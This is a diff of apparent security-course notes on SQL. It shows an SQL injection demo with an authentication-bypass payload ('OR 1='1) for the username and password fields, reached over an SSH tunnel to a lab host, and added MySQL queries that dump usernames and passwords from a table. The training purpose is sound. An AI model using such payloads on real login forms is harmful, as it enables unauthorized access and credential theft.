@@ -75,7 +75,7 @@ DAY 3 - SQL - Structured Query language
 https://www.w3schools.com/SQL/sql_syntax.asp
 ------------------------------------------------
 
-***********************--DEMO - SQL INJECTION--*******************************
+***********************--DEMO - SQL INJECTION--********************************************************
 ssh demo1@10.50.15.172 -L 1111:10.208.50.61:80
 > Username: 'OR 1='1
 > Password: 'OR 1='1
@@ -87,7 +87,7 @@ F12 > Network Tab
 > Password: 'OR 1='1
 Click Method: Post > Request on Right Pane > Toggle Raw data
 Copy, add to url as a variable by adding a ?
-********************************************************************************
+********************************************************************************************************
 
 ****************************--DEMO - DATABASE INTERACTIONS--********************************************
 mysql
@@ -99,10 +99,16 @@ show.tables ;
 show columns from columns ;
                      ^
                    table
+select tireid,name,size from session.Tires ;
+select username,passwd from session.userinfo ;
+select carid,size,type,cost,color,year from session.car ;
+
 ##DEFAULT DATABASES
 information_schema
 performance_schema
 mysql
+
+
 
 
 
